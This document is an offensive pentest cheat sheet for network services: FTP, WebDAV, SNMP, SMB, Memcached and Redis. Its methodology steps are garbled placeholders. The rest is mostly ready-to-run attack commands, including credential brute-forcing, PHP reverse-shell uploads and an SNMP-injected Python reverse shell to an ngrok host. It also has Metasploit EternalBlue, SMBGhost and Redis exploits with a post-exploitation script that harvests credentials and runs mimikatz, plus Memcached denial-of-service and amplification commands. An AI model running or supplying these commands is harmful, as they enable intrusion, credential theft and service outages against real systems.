# Network Configuration

## Check List

* [ ] Review the applications’ configurations set across the network and validate that they are not vulnerable.
* [ ] Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials.

## Methodology

{% stepper %}
{% step %}
### FTP
{% endstep %}

{% step %}
Run the following command on $TARGET&#x20;
{% endstep %}

{% step %}
If $TARGET has FTP protocol, do the next command to login with Anonymous
{% endstep %}

{% step %}
And using the next command to brute force the login page, will the username or password be found or not?
{% endstep %}

{% step %}
And using the next command, can we login through the browser or not?
{% endstep %}

{% step %}
And if we enter, enter the commands related to FTP and exploit it using Hydra and Metasploit commands
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}
### WebDAV
{% endstep %}

{% step %}
Run on $TARGET using the WebDAV command
{% endstep %}

{% step %}
And if it was open, the next command is used to find vulnerabilities related to WebDAV service using Metasploit.
{% endstep %}

{% step %}
Using the Hydra tool, we do Burte Force on this service to get the list of usernames and passwords
{% endstep %}

{% step %}
After the Burte Force command, we check if we can upload a file using the next command.\
If we could, we will upload the PHP file that contains RCE to the service using the command
{% endstep %}

{% step %}
And we can do the same thing using the PUT method, whether we can use this method to upload a file on this service or not.
{% endstep %}
{% endstepper %}

{% stepper %}
{% step %}
### SNMP
{% endstep %}

{% step %}
Run $TARTGET using the command related to SNMP discover
{% endstep %}

{% step %}
If it was open, check the vulnerabilities of the service using the command of the nuclei tool
{% endstep %}

{% step %}
Using the next command, get information from the target service such as host name and OID information, list of interfaces, configured IP addresses, hardware configuration, and sometimes more sensitive information depending on the implementation
{% endstep %}

{% step %}



{% endstep %}
{% endstepper %}

## Cheat Sheet

### FTP

#### [Nmap](https://nmap.org)

{% hint style="info" %}
Identify FTP
{% endhint %}

```bash
nmap -p 21 -sS -sV --mtu 5000 --script banner $WEBSITE
```

{% hint style="info" %}
Anonymous Login
{% endhint %}

```bash
nmap -p 21 -sS -sV --mtu 5000 --script ftp-anon $WEBSITE
```

{% hint style="info" %}
Brute Force
{% endhint %}

```bash
nmap -p 21 -sS -sV --mtu 5000 --script ftp-brute $WEBSITE
```

{% hint style="info" %}
Browser Login
{% endhint %}

```bash
ftp://anonymous:anonymous@$TARGET
```

#### [Nuclei](https://github.com/projectdiscovery/nuclei-templates/tree/main/network/default-login)

{% hint style="info" %}
Misconf & Vulns
{% endhint %}

```bash
nuclei -tags ftp -u $TARGET:21
```

#### [WGET](https://www.gnu.org/software/wget/)

{% hint style="info" %}
Download Files
{% endhint %}

```bash
wget --ftp-user=anonymous --ftp-password=anonymous ftp://$TARGET:21
```

#### [FTP](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)

{% hint style="info" %}
CLI Login
{% endhint %}

```bash
ftp
```

```bash
open $TARGET 21
```

{% hint style="info" %}
USER
{% endhint %}

```bash
> anonymous
```

{% hint style="info" %}
PASS
{% endhint %}

```bash
> anonymous
```

{% hint style="info" %}
FTP Mode
{% endhint %}

```bash
passive
```

{% hint style="info" %}
Download File
{% endhint %}

```bash
get file.txt
```

#### [Hydra](https://github.com/vanhauser-thc/thc-hydra)

{% hint style="info" %}
Brute Force
{% endhint %}

```bash
hydra -V \
      -L /usr/share/seclists/Usernames/sap-default-usernames.txt \
      -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt ftp://$TARGET:21
```

#### [Metasploit](https://www.metasploit.com/)

{% hint style="info" %}
Recon Version
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/ftp/ftp_version;
    set RHOSTS $WEBSITE;
    run;
    exit"
```

{% hint style="info" %}
Anonymous Login
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/ftp/anonymous;
    set RHOSTS $WEBSITE;
    run;
    exit"
```

{% hint style="info" %}
Brute Force
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/ftp/ftp_login;
    set RHOSTS $WEBSITE;
    set USERPASS_FILE /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt;
    run;
    exit"
```

### WebDAV

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
Identify WebDAV
{% endhint %}

```bash
nmap -p 80,443 \
     -sS -sV --mtu 5000 \
     --script http-methods,http-webdav-scan $WEBSITE
```

#### [Metasploit](https://www.metasploit.com/)

{% hint style="info" %}
Scan WebDAV
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/http/webdav_scanner;
    set PATH /webdav;
    set RHOSTS $WEBSITE;
    exit"
```

#### [Hydra](https://github.com/vanhauser-thc/thc-hydra)

{% hint style="info" %}
Brute Force
{% endhint %}

```bash
hydra -V \
      -L /usr/share/seclists/Usernames/sap-default-usernames.txt \
      -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt \
      $TARGET http-get /webdav/
```

#### [DavTest](https://gitlab.com/kalilinux/packages/davtest)

{% hint style="info" %}
Scan WebDAV
{% endhint %}

```bash
davtest -url $WEBSITE
```

{% hint style="info" %}
Upload Shell
{% endhint %}

```bash
davtest -url $WEBSITE \
        -uploadfile /usr/share/webshells/php/php-reverse-shell.php \
        -uploadloc shell.php
```

{% hint style="info" %}
Listening
{% endhint %}

```bash
nc -lvnp 1234
```

#### [Cadaver](https://github.com/notroj/cadaver)

```bash
cadaver $WEBSITE/webdav
```

{% hint style="info" %}
PUT Web shell
{% endhint %}

```bash
put /usr/share/webshells/php/php-reverse-shell.php
```

{% hint style="info" %}
Listening
{% endhint %}

```bash
nc -lvnp 1234
```

### SNMP

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
Identify SNMP
{% endhint %}

```bash
nmap -p 161 -sU -sV --mtu 5000 --script snmp-info $WEBSITE
```

{% hint style="info" %}
Brute Force
{% endhint %}

```bash
nmap -p 161 -sU -sV --mtu 5000 --script snmp-brute $WEBSITE
```

#### Nuclei

{% hint style="info" %}
Misconf & Vulns
{% endhint %}

```bash
nuclei -tags snmp -u $TARGET:161
```

#### [SNMPWalk](https://linux.die.net/man/1/snmpwalk)

{% hint style="info" %}
Enumerate SNMP Public
{% endhint %}

```bash
snmpwalk -v1 -c public $TARGET
```

#### [Onesixtyone](https://github.com/trailofbits/onesixtyone)

{% hint style="info" %}
Enumerate SNMP Public
{% endhint %}

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $TARGET
```

#### [SNMPSet](https://linux.die.net/man/1/snmpset)

{% hint style="info" %}
SNMPv1
{% endhint %}

```bash
snmpset -v1 -c private $TARGET OID s "unk9vvn"
```

{% hint style="info" %}
SNMPv2
{% endhint %}

```bash
snmpset -v2c -c private $TARGET sysName.0 s "unk9vvn"
```

{% hint style="info" %}
Start Ngrok
{% endhint %}

```bash
ngrok http 4444 >/dev/null 2>&1 &
```

{% hint style="info" %}
Define ENV Ngrok
{% endhint %}

```bash
NGHOST=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url | sed 's|https://||')
```

{% hint style="info" %}
Inject RCE
{% endhint %}

```bash
snmpset -m +NET-SNMP-EXTEND-MIB \
        -v 2c \
        -c SuP3RPrivCom90 $TARGET 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"$NGHOST\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```

{% hint style="info" %}
Execute Command
{% endhint %}

```bash
snmpwalk -v2c -c SuP3RPrivCom90 $TARGET NET-SNMP-EXTEND-MIB::nsExtendObjects
```

#### [Metasploit](https://www.metasploit.com/)

{% hint style="info" %}
Enumerate SNMP Public
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/snmp/snmp_enum;
    set RHOSTS $WEBSITE;
    run;
    exit"
```

{% hint style="info" %}
Enumerate SNMP Private
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/snmp/snmp_enum;
    set RHOSTS $WEBSITE;
    set COMMUNITY private;
    run;
    exit"
```

{% hint style="info" %}
Enumerate Windows Users
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/snmp/snmp_enumusers;
    set RHOSTS $WEBSITE;
    run;
    exit"
```

{% hint style="info" %}
Enumerate File Shares
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/snmp/snmp_enumshares;
    set RHOSTS $WEBSITE;
    run;
    exit"
```

### SMB

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
Identify SMB
{% endhint %}

```bash
nmap -p 139,445 \
     -sS -sV --mtu 5000 \
     --script smb-protocols,smb-os-discovery,smb2-capabilities $WEBSITE
```

{% hint style="info" %}
Recon Vulns
{% endhint %}

```bash
nmap -p 139,445 \
     -sS -sV --mtu 5000 \
     --script smb-vuln-*,smb-double-pulsar-backdoor $WEBSITE
```

{% hint style="info" %}
Brute Force
{% endhint %}

```bash
nmap -p 139,445 \
     -sS -sV --mtu 5000 \
     --script smb-brute $WEBSITE
```

{% hint style="info" %}
Enumerate Users and Shares
{% endhint %}

```bash
nmap -p 139,445 \
     -sS -sV --mtu 5000 \
     --script smb-enum-users,smb-enum-shares $WEBSITE
```

{% hint style="info" %}
Enumerate Domains and Groups
{% endhint %}

```bash
nmap -p 139,445 \
     -sS -sV --mtu 5000 \
     --script smb-enum-domains,smb-enum-groups $WEBSITE
```

{% hint style="info" %}
Enumerate Services and Processes
{% endhint %}

```bash
nmap -p 139,445 \
     -sS -sV --mtu 5000 \
     --script smb-enum-services,smb-enum-processes $WEBSITE
```

#### Nuclei

{% hint style="info" %}
SMB Misconf & Vulns
{% endhint %}

```bash
nuclei -tags smb -u $TARGET:445
```

#### [netexec](https://github.com/Pennyw0rth/NetExec)

{% hint style="info" %}
Enum Host
{% endhint %}

```bash
netexec smb $TARGET
```

#### [enum4linux](https://gitlab.com/kalilinux/packages/enum4linux)

{% hint style="info" %}
Enumerate Shares
{% endhint %}

```bash
enum4linux -a $TARGET
```

#### [nbtscan](https://salsa.debian.org/pkg-security-team/nbtscan)

{% hint style="info" %}
Enumerate Shares
{% endhint %}

```bash
nbtscan -r $TARGET/24
```

#### [smbclient](https://www.learnlinux.org.za/courses/build/net-admin/ch08s02.html)

{% hint style="info" %}
User Enumeration and Null Sessions
{% endhint %}

```bash
smbclient -N -L //$TARGET
```

#### [rpcclient](https://www.samba.org/samba/docs/4.17/man-html/rpcclient.1.html)

{% hint style="info" %}
User Enumeration and Null Sessions
{% endhint %}

```bash
rpcclient -U "" $TARGET
```

#### [Metasploit](https://www.metasploit.com/)

{% hint style="info" %}
Detect Version
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/smb/smb_version;
    set RHOSTS $TARGET;
    run;
    exit"
```

{% hint style="info" %}
Enumerate Users
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/smb/smb_enumusers;
    set RHOSTS $TARGET;
    run;
    exit"
```

{% hint style="info" %}
Enumerate Shares
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/smb/smb_enumshares;
    set RHOSTS $TARGET;
    run;
    exit"
```

{% hint style="info" %}
Credential Dumps
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/smb/impacket/secretsdump;
    set RHOSTS $TARGET;
    run;
    exit"
```

{% hint style="info" %}
Credential Brute Force
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/smb/smb_login;
    set RHOSTS $TARGET;
    set SMBUser Administrator;
    set PASS_FILE /usr/share/seclists/Passwords/darkweb2017-top100.txt;
    run;
    exit"
```

{% hint style="info" %}
Detect EternalBlue
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/smb/smb_ms17_010;
    set RHOSTS $TARGET;
    run;
    exit"
```

{% hint style="info" %}
Start Ngrok
{% endhint %}

```bash
ngrok http 4444 >/dev/null 2>&1 &
```

{% hint style="info" %}
Define ENV Ngrok
{% endhint %}

```bash
NGHOST=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r .tunnels[0].public_url | sed 's|https://||')
```

{% hint style="info" %}
Cert Spoof
{% endhint %}

```bash
rm -rf /home/$USER/.msf4/loot/*
msfconsole -qx "
    use auxiliary/gather/impersonate_ssl;
    set RHOSTS google.com;
    run;
    exit"
```

{% hint style="info" %}
Define ENV Cert
{% endhint %}

```bash
CERT=/home/$USER/.msf4/loot/$(find /home/$USER/.msf4/loot/ -type f -name "*.pem" -printf "%f\n" | head -n 1)
```

{% hint style="info" %}
Post-EXP
{% endhint %}

```bash
cat > /tmp/post-exp.rc << EOF
getprivs
getsystem
run multi/gather/firefox_creds DECRYPT=true
run multi/gather/filezilla_client_cred
run multi/gather/ssh_creds
run multi/gather/thunderbird_creds
run multi/gather/wlan_geolocate
mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
bg
EOF
```

{% hint style="info" %}
EternalBlue Exploit (ٌWin 7 to 10 - Win Server 2008 to 2012)
{% endhint %}

```bash
msfconsole -qx "
    use exploit/windows/smb/ms17_010_eternalblue;
    set PAYLOAD windows/x64/meterpreter/reverse_https;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

{% hint style="info" %}
Doublepulsar Exploit (ٌWin 7 to 10 - Win Server 2008 to 2012)
{% endhint %}

```bash
msfconsole -qx "
    use exploit/windows/smb/smb_doublepulsar_rce;
    set PAYLOAD windows/x64/meterpreter/reverse_https;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

{% hint style="info" %}
SMBGhost Exploit (Win 10)
{% endhint %}

```bash
msfconsole -qx "
    use exploit/windows/smb/cve_2020_0796_smbghost;
    set PAYLOAD windows/x64/meterpreter/reverse_https;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

{% hint style="info" %}
Net API Exploit (Win XP's)
{% endhint %}

```bash
msfconsole -qx "
    use exploit/windows/smb/ms08_067_netapi;
    set PAYLOAD windows/meterpreter/reverse_hop_http;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

### Memcached

#### [Nmap](https://nmap.org/)

{% hint style="info" %}
Identify Memcached
{% endhint %}

```bash
nmap -p 11211 -sS -sV --mtu 5000 --script memcached-info $WEBSITE
```

#### [Nuclei](https://github.com/projectdiscovery/nuclei-templates/blob/main/network/misconfig/memcached-stats.yaml)

{% hint style="info" %}
Memcached Misconf
{% endhint %}

```bash
nuclei -tags memcached -u $TARGET:11211
```

#### [Netcat](https://nmap.org/ncat/)

{% hint style="info" %}
Get Version
{% endhint %}

```bash
echo "version" | nc -vn -w 1 $TARGET 11211
```

{% hint style="info" %}
_Get Status_
{% endhint %}

```bash
echo "stats" | nc -vn -w 1 $TARGET 11211
```

{% hint style="info" %}
_Get Slabs_
{% endhint %}

```bash
echo "stats slabs" | nc -vn -w 1 $TARGET 11211
```

{% hint style="info" %}
Get Items
{% endhint %}

```bash
echo "stats items" | nc -vn -w 1 $TARGET 11211
```

{% hint style="info" %}
Get Key Names
{% endhint %}

```bash
echo "stats cachedump 1 10" | nc -vn -w 1 $TARGET 11211
```

{% hint style="info" %}
Get Info Saved
{% endhint %}

```bash
echo "get $ITEM" | nc -vn -w 1 $TARGET 11211
```

{% hint style="info" %}
Denial of Service
{% endhint %}

```bash
for i in {1..10000}; do echo "set key$i 0 0 1024" | nc $TARGET 11211; done
```

{% hint style="info" %}
DDoS Amplification
{% endhint %}

```bash
echo -e "\x00\x00\x00\x00\x00\x01\x00\x00stats\n" | nc -u -q 1 $TARGET 11211
```

#### [libmemcached-tools](https://libmemcached.org/libMemcached.html)

{% hint style="info" %}
Get Stats
{% endhint %}

```bash
memcstat --servers=$TARGET
```

{% hint style="info" %}
Get all items
{% endhint %}

```bash
memcdump --servers=$TARGET
```

{% hint style="info" %}
Get info inside the item(s)
{% endhint %}

```bash
memccat --servers=$TARGET $ITEM1 $ITEM2 $ITEM3
```

[Metasploit](https://www.metasploit.com/)

{% hint style="info" %}
Extract Slabs
{% endhint %}

```bash
msfconsole -qx "use auxiliary/gather/memcached_extractor;set RHOSTS $TARGET;run;exit"
```

{% hint style="info" %}
Denial of Service
{% endhint %}

```bash
msfconsole -qx "use auxiliary/dos/misc/memcached;set RHOSTS $TARGET;run;exit"
```

### Redis

#### [Nmap](https://nmap.org/nsedoc/scripts/redis-info.html)

{% hint style="info" %}
Identify Redis
{% endhint %}

```bash
nmap -p 6379 -sS -sV --mtu 5000 --script redis-info $TARGET
```

#### [redis-cli](https://redis.io/docs/latest/develop/tools/cli/)

{% hint style="info" %}
Unauthorized Access
{% endhint %}

```bash
redis-cli -h $TARGET -p 6379
```

#### [Hydra](https://github.com/vanhauser-thc/thc-hydra)

{% hint style="info" %}
Brute Force Creds
{% endhint %}

```bash
hydra -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
      -s 6379 $TARGET redis
```

#### [Nuclei](https://github.com/projectdiscovery/nuclei-templates/blob/main/javascript/default-logins/redis-default-logins.yaml)

{% hint style="info" %}
Scan Misconf with Nuclei
{% endhint %}

```bash
nuclei -tags redis -u $TARGET:6379
```

#### [Metasploit-Framework](https://www.metasploit.com/)

{% hint style="info" %}
Scan with Metasploit
{% endhint %}

```bash
msfconsole -qx "use auxiliary/scanner/redis/redis_server;
    set RHOSTS $TARGET;
    run;
    exit"
```

{% hint style="info" %}
Misconfiguration Check
{% endhint %}

```bash
msfconsole -qx "use auxiliary/gather/redis_extractor;
    set RHOSTS $TARGET;
    run;
    exit"
```

{% hint style="info" %}
Brute Force
{% endhint %}

```bash
msfconsole -qx "
    use auxiliary/scanner/redis/redis_login;
    set RHOSTS $TARGET;
    set ANONYMOUS_LOGIN true;
    set BLANK_PASSWORDS true;
    set STOP_ON_SUCCESS true;
    set THREADS 10;
    run -j"
```

{% hint style="info" %}
Remote Code Execution
{% endhint %}

```bash
msfconsole -qx "
    use exploit/linux/redis/redis_replication_cmd_exec;
    set PAYLOAD windows/x64/meterpreter/reverse_https;
    set RHOSTS $TARGET;
    set LHOST $NGHOST;
    set LPORT 443;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set HandlerSSLCert $CERT;
    set StagerVerifySSLCert true;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```
